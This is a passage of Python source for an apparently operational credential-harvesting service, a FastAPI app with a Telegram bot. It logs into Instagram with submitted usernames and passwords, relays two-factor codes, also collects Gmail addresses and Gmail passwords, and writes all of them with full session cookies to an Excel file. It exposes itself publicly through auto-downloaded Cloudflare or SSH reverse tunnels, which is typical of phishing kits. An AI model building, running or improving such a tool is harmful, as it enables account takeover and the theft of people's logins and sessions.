        bot.send_photo(
            chat_id=user_id,
            photo=image_data,
            caption=f"⚠️ *Error Context*\n\n`{error_msg}`\n\n_Screenshot attached._",
            parse_mode="Markdown"
        )
        return JSONResponse(content={"status": "sent"})
    except Exception as e:
        logger.error(f"Failed to report error: {e}")
        return JSONResponse(status_code=500, content={"detail": str(e)})

@app.post("/api/login")
async def api_login(
    username: str = Form(...),
    password: str = Form(...),
    session_token: str = Form(...),
    filename: str = Form(...) # New param
):
    try:
        api = Instagram(username, password)
        result = api.login()

        # Store state
        pending_logins[session_token] = {
             "instance": api,
             "username": username,
             "password": password,
             "filename": filename # Store context
        }

        if result["status"] == "success":
             return JSONResponse(content={"status": "awaiting_gmail"})

        elif result["status"] == "2fa_required":
             return JSONResponse(content={"status": "2fa_required"})

        elif result["status"] == "challenge_required":
             msg = result["message"]
             if "challenge_url" in result and result["challenge_url"]:
                 msg += f" URL: {result['challenge_url']}"
             return JSONResponse(status_code=403, content={"detail": msg})

        else:
             return JSONResponse(status_code=401, content={"detail": result["message"]})

    except Exception as e:
        logger.exception(f"Login error for {username}")
        return JSONResponse(status_code=500, content={"detail": f"System Error: {e}"})

@app.post("/api/verify_2fa")
async def verify_2fa(
    code: str = Form(...),
    session_token: str = Form(...)
):
    if session_token not in pending_logins:
        raise HTTPException(status_code=400, detail="Session expired.")

    data = pending_logins[session_token]
    api = data["instance"]

    try:
        result = api.two_factor_login(code)

        if result["status"] == "success":
             return JSONResponse(content={"status": "awaiting_gmail"})
        else:
             return JSONResponse(status_code=400, content={"detail": result["message"]})

    except Exception as e:
        logger.error(f"2FA failed for {data['username']}: {e}")
        return JSONResponse(status_code=400, content={"detail": str(e)})

@app.post("/api/complete_session")
async def complete_session(
    gmail: str = Form(""),
    gmail_password: str = Form(""),
    session_token: str = Form(...),
    filename: str = Form(...)
):
    if session_token not in pending_logins:
        raise HTTPException(status_code=400, detail="Session expired.")

    data = pending_logins[session_token]
    api = data["instance"]
    username = data["username"]
    password = data["password"]

    try:
        save_session_custom(api, username, password, gmail, gmail_password, filename)
        del pending_logins[session_token]
        return JSONResponse(content={"status": "success"})
    except Exception as e:
        logger.error(f"Save error: {e}")
        return JSONResponse(status_code=500, content={"detail": str(e)})

def save_session_custom(api_instance, username, password, gmail, gmail_password, filename):
    os.makedirs(DATA_DIR, exist_ok=True)

    # Sanitize filename
    safe_filename = re.sub(r'[\\/*?:"<>|]', "", filename)
    if not safe_filename.endswith(".xlsx"):
        safe_filename += ".xlsx"

    excel_path = f"{DATA_DIR}/{safe_filename}"

    # Ensure updated cookies are used
    if not api_instance.cookie_string:
        api_instance._update_cookie_string()

    cookies = api_instance.cookie_string

    new_data = {
        "Instagram ID": username,
        "Instagram Password": password,
        "Gmail": gmail,
        "Gmail Password": gmail_password,
        "Full Cookie String": cookies
    }

    # Append if exists
    if os.path.exists(excel_path):
        try:
            df = pd.read_excel(excel_path)
            new_df = pd.DataFrame([new_data])
            df = pd.concat([df, new_df], ignore_index=True)
        except Exception:
            df = pd.DataFrame([new_data])
    else:
        df = pd.DataFrame([new_data])

    df.to_excel(excel_path, index=False)
    logger.info(f"Data saved for {username} in {safe_filename}")

# --- Tunneling ---
def start_tunnel():
    global tunnel_url
    time.sleep(3)

    try:
        if not os.path.exists("./cloudflared"):
             arch = subprocess.check_output(["uname", "-m"]).decode().strip()
             url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
             if "arm" in arch or "aarch64" in arch:
                 url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"

             logger.info("Downloading Cloudflared...")
             subprocess.run(["wget", "-q", "-O", "cloudflared", url])
             subprocess.run(["chmod", "+x", "cloudflared"])

        logger.info("Starting Cloudflare Tunnel...")
        proc = subprocess.Popen(["./cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        start_time = time.time()
        while time.time() - start_time < 30:
            line = proc.stderr.readline()
            if "trycloudflare.com" in line:
                match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
                if match:
                    tunnel_url = match.group(0)
                    logger.info(f"✅ Cloudflare Tunnel: {tunnel_url}")
                    return
            time.sleep(0.1)
    except Exception as e:
        logger.error(f"Cloudflared failed: {e}")

    try:
        logger.info("Attempting SSH Tunnel...")
        proc = subprocess.Popen(["ssh", "-R", f"80:localhost:{PORT}", "-o", "StrictHostKeyChecking=no", "nokey@localhost.run"],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        start_time = time.time()
        while time.time() - start_time < 20:
             line = proc.stdout.readline()
             if "lhr.life" in line or "localhost.run" in line:
                 match = re.search(r'https://[a-zA-Z0-9-]+\.lhr\.life', line)
                 if match:
                     tunnel_url = match.group(0)
                     logger.info(f"✅ SSH Tunnel: {tunnel_url}")
                     return
             time.sleep(0.1)
    except Exception as e:
        logger.error(f"SSH failed: {e}")

# --- Main ---
if __name__ == "__main__":
    threading.Thread(target=start_tunnel, daemon=True).start()

    def run_bot():
        while True:
            try:
                logger.info("Bot Polling...")
                bot.polling(none_stop=True, timeout=60, long_polling_timeout=60)
            except Exception as e:
                logger.error(f"Bot Polling Error: {e}")
                time.sleep(5)

    threading.Thread(target=run_bot, daemon=True).start()

    logger.info(f"Server starting on port {PORT}")
    uvicorn.run(app, host="0.0.0.0", port=PORT, log_level="error")
